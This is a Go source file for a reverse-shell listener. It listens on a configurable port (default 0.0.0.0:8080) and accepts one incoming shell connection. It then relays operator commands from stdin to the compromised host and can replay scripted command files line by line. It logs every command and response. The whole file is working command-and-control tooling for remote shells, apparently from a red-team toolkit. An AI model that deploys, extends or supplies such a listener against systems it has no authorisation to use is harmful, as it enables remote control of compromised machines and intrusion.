package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	cf "github.com/thepcn3rd/goAdvsCommonFunctions"
)

type Configuration struct {
	ListeningIP   string `json:"listeningIP"`
	ListeningPort string `json:"listeningPort"`
	ScriptsFolder string `json:"scriptsFolder"`
	LogFile       string `json:"logFile"`
}

func (c *Configuration) CreateConfig() error {
	c.ListeningIP = "0.0.0.0"
	c.ListeningPort = "8080"
	c.ScriptsFolder = "scripts"
	c.LogFile = "output.log"

	cf.CreateDirectory("/" + c.ScriptsFolder)

	jsonData, err := json.MarshalIndent(c, "", "    ")
	if err != nil {
		return err
	}

	err = os.WriteFile("config.json", jsonData, 0644)
	if err != nil {
		return err
	}

	return nil
}

func (c *Configuration) LoadConfig(cPtr string) error {
	configFile, err := os.Open(cPtr)
	if err != nil {
		return err
	}
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	if err := decoder.Decode(&c); err != nil {
		return err
	}

	return nil
}

// Define a struct to hold the loggers.
type App struct {
	sLog *log.Logger
	fLog *log.Logger
}

// Constructor function to initialize the App struct.
func NewApp(c Configuration) *App {
	// Open a log file for writing.
	logFile, err := os.OpenFile(c.LogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}

	// Create loggers.
	sLog := log.New(os.Stdout, "", 0)           // No timestamp
	fLog := log.New(logFile, "", log.LstdFlags) // Includes timestamp

	// Return a new App instance with the loggers.
	return &App{
		sLog: sLog,
		fLog: fLog,
	}
}

// Method to log to the file.
func (a *App) LogToFile(message string) {
	a.fLog.Printf(message)
}

// Method to log to stdout.
func (a *App) LogToStdout(message string) {
	a.sLog.Printf(message)
}

func (a *App) LogToBoth(message string) {
	a.sLog.Printf(message)
	a.fLog.Printf(message)
}

func main() {
	var config Configuration
	ConfigPtr := flag.String("config", "config.json", "Configuration file to load for the proxy")
	flag.Parse()

	log.Println("Loading the following config file: " + *ConfigPtr + "\n")
	if err := config.LoadConfig(*ConfigPtr); err != nil {
		//fmt.Println("Could not load the configuration file, creating a new default config.json")
		config.CreateConfig()
		log.Printf("Modify the config.json file to customize how the tool functions: %v\n", err)
	}

	app := NewApp(config)

	// Start the TCP server
	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", config.ListeningIP, config.ListeningPort))
	if err != nil {
		app.LogToBoth("Failed to start server: " + err.Error())
	}
	defer listener.Close()

	app.LogToBoth(fmt.Sprintf("Listening for reverse shell on %s:%s...\n", config.ListeningIP, config.ListeningPort))

	// Accept incoming connections
	conn, err := listener.Accept()
	if err != nil {
		app.LogToBoth(fmt.Sprintf("Failed to accept connection: %v\n", err))
	}
	defer conn.Close()
	// Get the remote address
	remoteAddr := conn.RemoteAddr()

	// Type assert to *net.TCPAddr to get the IP address
	if tcpAddr, ok := remoteAddr.(*net.TCPAddr); ok {
		app.LogToBoth(fmt.Sprintf("Connected IP address: %s\n", tcpAddr.IP))
	} else {
		app.LogToBoth(fmt.Sprintf("Could not get IP address from remote address: %s\n", remoteAddr))
	}

	// Handle the connection
	go handleConnection(conn, config, app)

	// Keep the program running
	select {}
}

func handleConnection(conn net.Conn, c Configuration, a *App) {
	//a := NewApp(c)
	// Create a reader and writer for the connection
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Read from the connection and print to stdout
	go func() {
		for {
			message, err := reader.ReadString('\n')
			if err != nil {
				a.LogToBoth(fmt.Sprintf("Connection closed: %v", err))
				return
			}
			a.LogToFile(fmt.Sprint("R: " + message))
			a.LogToStdout(message)
		}
	}()

	// Read from stdin and write to the connection
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text()
		if strings.Contains(command, "script:") {
			scriptFile := strings.Replace(command, "script:", "", -1)
			scriptFilePath := c.ScriptsFolder + string(filepath.Separator) + scriptFile
			lines, err := readLines(scriptFilePath)
			if err != nil {
				a.LogToBoth(fmt.Sprintln("Error reading script:", err))
			}
			a.LogToBoth(fmt.Sprintf("Read script from location: %s\n", scriptFilePath))
			for _, line := range lines {
				_, err := writer.WriteString(line + "\n")
				if err != nil {
					a.LogToBoth(fmt.Sprintf("Failed to send command: %v", err))
					return
				}
				writer.Flush()
				a.LogToStdout(fmt.Sprintf("\nC: %s\n\n", line))
				a.LogToFile(fmt.Sprintf("C: %s\n", line))
				// Sleep for 1 second after each command is executed
				time.Sleep(1 * time.Second)
			}
		} else {
			_, err := writer.WriteString(command + "\n")
			if err != nil {
				a.LogToBoth(fmt.Sprintf("Failed to send command: %v", err))
				return
			}
			writer.Flush()
			a.LogToStdout(fmt.Sprintf("\nC: %s\n\n", command))
			a.LogToFile(fmt.Sprintf("C: %s\n", command))
		}
	}
}

func readLines(filename string) ([]string, error) {
	// Open the file
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close() // Ensure the file is closed after reading

	// Create a scanner to read the file line by line
	scanner := bufio.NewScanner(file)

	var lines []string
	for scanner.Scan() {
		lines = append(lines, scanner.Text()) // Append each line to the slice
	}

	// Check for any errors during scanning
	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}
